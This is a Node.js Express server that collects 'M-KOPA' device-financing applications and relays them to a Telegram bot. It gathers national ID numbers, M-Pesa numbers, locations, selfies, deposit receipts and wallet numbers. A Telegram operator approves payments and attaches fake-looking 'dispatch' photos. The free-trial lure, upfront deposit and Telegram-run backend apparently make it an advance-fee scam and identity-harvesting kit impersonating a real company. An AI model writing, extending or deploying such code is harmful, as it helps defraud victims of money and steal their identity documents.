const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID_HERE';

app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// In-memory application storage
const applications = {};

// Helper: Send image or text to Telegram Bot
async function sendTelegramPhoto(photoDataUrl, caption) {
    try {
        const matches = photoDataUrl.match(/^data:([A-Za-z-+/]+);base64,(.+)$/);
        if (!matches || matches.length !== 3) return;

        const buffer = Buffer.from(matches[2], 'base64');
        const FormData = require('form-data');
        const form = new FormData();
        
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('photo', buffer, { filename: 'upload.jpg' });
        form.append('caption', caption);
        form.append('parse_mode', 'HTML');

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
    } catch (err) {
        console.error('Telegram photo upload error:', err.message);
    }
}

async function sendTelegramMessage(text, replyMarkup) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            reply_markup: replyMarkup
        });
    } catch (err) {
        console.error('Telegram message error:', err.message);
    }
}

// 1. STAGE 4 SUBMISSION: Submit Personal Profile Details
app.post('/api/submit-personal-details', async (req, res) => {
    try {
        const { product, idNumber, mpesaNumber, location, selfieDataUrl, amount, dailyRate } = req.body;
        const appId = 'APP-' + Date.now().toString().slice(-6);

        applications[appId] = {
            appId,
            product,
            idNumber,
            mpesaNumber,
            location,
            amount,
            dailyRate,
            status: 'PENDING_PAYMENT'
        };

        const caption = `<b>📋 NEW M-KOPA APPLICATION (${appId})</b>\n\n` +
            `📦 <b>Product:</b> ${product.model}\n` +
            `📂 <b>Category:</b> ${product.category}\n` +
            `🪪 <b>ID Number:</b> ${idNumber}\n` +
            `📱 <b>Phone:</b> ${mpesaNumber}\n` +
            `📍 <b>Location:</b> ${location}\n` +
            `💰 <b>Required Deposit:</b> KES ${amount}\n` +
            `🎁 <b>Trial Offer:</b> 1 Week FREE (0 KES/day), then KES ${dailyRate}/day`;

        if (selfieDataUrl) {
            await sendTelegramPhoto(selfieDataUrl, caption);
        } else {
            await sendTelegramMessage(caption);
        }

        res.json({ success: true, appId });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, message: 'Failed to process application details.' });
    }
});

// 2. STAGE 5 SUBMISSION: Submit Payment Receipt
app.post('/api/submit-payment-receipt', async (req, res) => {
    try {
        const { appId, walletNumber, paymentScreenshotDataUrl } = req.body;

        if (!applications[appId]) {
            return res.status(400).json({ success: false, message: 'Application session not found.' });
        }

        const appData = applications[appId];
        appData.walletNumber = walletNumber;
        appData.status = 'AWAITING_APPROVAL';

        const caption = `<b>🚨 TRANSACTION VERIFICATION REQUIRED (${appId})</b>\n\n` +
            `👤 <b>Applicant ID:</b> ${appData.idNumber}\n` +
            `📦 <b>Item:</b> ${appData.product.model}\n` +
            `💳 <b>Paying Wallet:</b> ${walletNumber}\n` +
            `💰 <b>Expected Deposit:</b> KES ${appData.amount}\n\n` +
            `<i>Applicant has completed transaction & uploaded receipt screenshot. Please approve or reject:</i>`;

        const replyMarkup = {
            inline_keyboard: [
                [
                    { text: '✅ Approve Order', callback_data: `approve_${appId}` },
                    { text: '❌ Reject Order', callback_data: `reject_${appId}` }
                ]
            ]
        };

        if (paymentScreenshotDataUrl) {
            await sendTelegramPhoto(paymentScreenshotDataUrl, caption);
            await sendTelegramMessage(`Select decision for ${appId}:`, replyMarkup);
        } else {
            await sendTelegramMessage(caption, replyMarkup);
        }

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, message: 'Failed to submit receipt.' });
    }
});

// 3. Client Polling: Check Approval Status & Photo
app.get('/api/check-status/:appId', (req, res) => {
    const appData = applications[req.params.appId];
    if (!appData) {
        return res.json({ status: 'NOT_FOUND' });
    }
    res.json({
        status: appData.status,
        photoUrl: appData.dispatchPhotoUrl || null
    });
});

// 4. Telegram Webhook (Processes Admin Approvals & Photo Dispatch)
app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        // Handle Inline Button Approvals
        if (update.callback_query) {
            const callback = update.callback_query;
            const data = callback.data;

            if (data.startsWith('approve_')) {
                const appId = data.replace('approve_', '');
                if (applications[appId]) {
                    applications[appId].status = 'APPROVED';
                    await sendTelegramMessage(`✅ <b>Application ${appId} APPROVED!</b> User has been transitioned to Success stage.`);
                }
            } else if (data.startsWith('reject_')) {
                const appId = data.replace('reject_', '');
                if (applications[appId]) {
                    applications[appId].status = 'REJECTED';
                    await sendTelegramMessage(`❌ <b>Application ${appId} REJECTED.</b> User prompted to re-try payment.`);
                }
            }
        }

        // Handle Dispatch Unit Photo Upload from Telegram Admin
        if (update.message && update.message.photo) {
            const photoArray = update.message.photo;
            const largestPhoto = photoArray[photoArray.length - 1]; // Highest resolution
            const fileId = largestPhoto.file_id;

            // Fetch File Path from Telegram API
            const fileRes = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`);
            const filePath = fileRes.data.result.file_path;
            const fullPhotoUrl = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${filePath}`;

            // Attach photo to recent awaiting application
            const pendingAppId = Object.keys(applications).reverse().find(id => applications[id].status === 'AWAITING_APPROVAL');
            if (pendingAppId) {
                applications[pendingAppId].dispatchPhotoUrl = fullPhotoUrl;
                await sendTelegramMessage(`📸 <b>Dispatch photo linked to application ${pendingAppId}!</b>`);
            }
        }

        res.sendStatus(200);
    } catch (err) {
        console.error('Webhook error:', err);
        res.sendStatus(500);
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
